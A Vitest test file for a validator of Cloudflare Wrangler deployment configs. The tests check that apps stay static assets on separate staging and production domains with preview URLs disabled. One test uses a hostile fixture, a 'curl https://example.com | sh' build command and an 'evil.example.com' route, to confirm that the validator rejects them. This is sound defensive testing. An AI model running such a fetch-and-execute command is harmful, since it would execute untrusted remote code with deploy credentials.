import { describe, expect, it } from "vitest";
import { checkWranglerConfig, missingWranglerConfigs } from "./wrangler.ts";

function config(appId: string, host: { staging: string; production: string }) {
  return {
    name: `shkriuss-${appId}`,
    compatibility_date: "2026-10-01",
    assets: { directory: "./dist", not_found_handling: "single-page-application" },
    workers_dev: false,
    preview_urls: false,
    send_metrics: false,
    env: {
      staging: {
        name: `shkriuss-${appId}-staging`,
        routes: [{ pattern: host.staging, custom_domain: true }],
        workers_dev: false,
        preview_urls: false,
      },
      production: {
        name: `shkriuss-${appId}-production`,
        routes: [{ pattern: host.production, custom_domain: true }],
        workers_dev: false,
        preview_urls: false,
      },
    },
  };
}

const hub = config("hub", { staging: "shkriuss.dev", production: "shkriuss.app" });
const check = (file: string, value: unknown) => checkWranglerConfig(file, JSON.stringify(value));

describe("checkWranglerConfig", () => {
  it("accepts the hub at the apex and an app at its id", () => {
    expect(check("apps/hub/wrangler.json", hub)).toEqual([]);
    const notes = config("notes", {
      staging: "notes.shkriuss.dev",
      production: "notes.shkriuss.app",
    });
    expect(check("apps/notes/wrangler.json", notes)).toEqual([]);
  });

  it("keeps workers.dev and preview URLs off everywhere, so nothing bypasses Access", () => {
    const missing = structuredClone(hub) as Record<string, unknown>;
    delete missing["preview_urls"];
    const messages = check("apps/hub/wrangler.json", missing).map((v) => v.message);
    expect(messages).toHaveLength(1);
    expect(messages[0]).toMatch(/^preview_urls must be false/);
    const staging = structuredClone(hub);
    staging.env.staging.workers_dev = true;
    expect(check("apps/hub/wrangler.json", staging)[0]?.message).toMatch(
      /^env\.staging\.workers_dev must be false/,
    );
  });

  it("puts each environment on its own domain", () => {
    const swapped = config("hub", { staging: "shkriuss.app", production: "shkriuss.dev" });
    const messages = check("apps/hub/wrangler.json", swapped).map((v) => v.message);
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/^env\.staging\.routes must be .*"shkriuss\.dev"/);
    const wrongApp = config("notes", {
      staging: "todo.shkriuss.dev",
      production: "notes.shkriuss.app",
    });
    expect(check("apps/notes/wrangler.json", wrongApp)).toHaveLength(1);
  });

  it("allows only static assets and the two environments", () => {
    const script = { ...hub, main: "src/index.ts", routes: [] };
    const messages = check("apps/hub/wrangler.json", script).map((v) => v.message);
    expect(messages).toHaveLength(2);
    expect(messages[0]).toMatch(/remove main/);
    expect(messages[1]).toMatch(/Routes belong in env/);
    const extra = { ...hub, env: { ...hub.env, preview: hub.env.staging } };
    expect(check("apps/hub/wrangler.json", extra)[0]?.message).toMatch(
      /exactly production and staging/,
    );
  });

  it("allows no other key, at the root or in an environment", () => {
    // Each could run a command, start a Worker script, upload other files or add a route, with
    // the deploy token, after CI recorded the hash of every file.
    const build = { ...hub, build: { command: "curl https://example.com | sh" } };
    expect(check("apps/hub/wrangler.json", build).map((v) => v.message)).toEqual([
      "build is not allowed: apps are static assets on their own domains only (ADR 0006).",
    ]);
    const production = structuredClone(hub) as Record<string, unknown> & typeof hub;
    Object.assign(production.env.production, {
      main: "src/index.ts",
      assets: { directory: "./other" },
      route: "evil.example.com/*",
    });
    expect(check("apps/hub/wrangler.json", production).map((v) => v.message)).toEqual([
      "Apps are static assets only; remove env.production.main (ADR 0006).",
      "env.production.assets is not allowed: apps are static assets on their own domains only (ADR 0006).",
      "env.production.route is not allowed: apps are static assets on their own domains only (ADR 0006).",
    ]);
    const route = { ...hub, route: "evil.example.com/*" };
    expect(check("apps/hub/wrangler.json", route).map((v) => v.message)).toEqual([
      "Routes belong in env.staging and env.production only.",
    ]);
  });

  it("takes only Wrangler's own schema and a compatibility date", () => {
    const schema = { ...hub, $schema: "https://example.com/schema.json" };
    expect(check("apps/hub/wrangler.json", schema)[0]?.message).toMatch(
      /^\$schema must be "\.\/node_modules\/wrangler\/config-schema\.json"/,
    );
    expect(
      check("apps/hub/wrangler.json", {
        ...hub,
        $schema: "./node_modules/wrangler/config-schema.json",
      }),
    ).toEqual([]);
    for (const date of ["tomorrow", 20_261_001, undefined]) {
      expect(check("apps/hub/wrangler.json", { ...hub, compatibility_date: date })).toEqual([
        {
          file: "apps/hub/wrangler.json",
          message: "compatibility_date must be a date, as 2026-10-01.",
        },
      ]);
    }
  });

  it("rejects other formats and invalid JSON", () => {
    expect(checkWranglerConfig("apps/hub/wrangler.toml", "")[0]?.message).toMatch(
      /Use wrangler.json/,
    );
    expect(checkWranglerConfig("apps/hub/wrangler.json", "{")[0]?.message).toMatch(/Invalid JSON/);
  });
});

describe("missingWranglerConfigs", () => {
  it("requires a wrangler.json next to every app's package.json", () => {
    expect(
      missingWranglerConfigs([
        "apps/hub/package.json",
        "apps/hub/wrangler.json",
        "apps/notes/package.json",
      ]),
    ).toEqual([{ file: "apps/notes", message: "Every app needs a wrangler.json." }]);
  });
});
